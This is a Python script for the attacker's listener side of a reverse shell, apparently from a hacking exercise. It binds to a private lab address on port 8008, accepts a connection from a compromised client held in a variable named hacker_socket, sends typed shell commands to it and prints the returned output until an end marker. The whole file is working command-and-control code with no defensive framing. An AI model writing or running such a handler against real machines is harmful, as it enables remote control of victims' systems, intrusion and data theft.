import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
    print("connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command ")
            hacker_socket.send(command.encode())
            if command == "stop":

                hacker_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                hacker_socket.send(command.encode())
                continue
            else:
                full_command_result = b''
                while True:

                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result +=chunk
                print(full_command_result.decode())
    except Exception:
        print("Exception occured")
        hacker_socket.close()
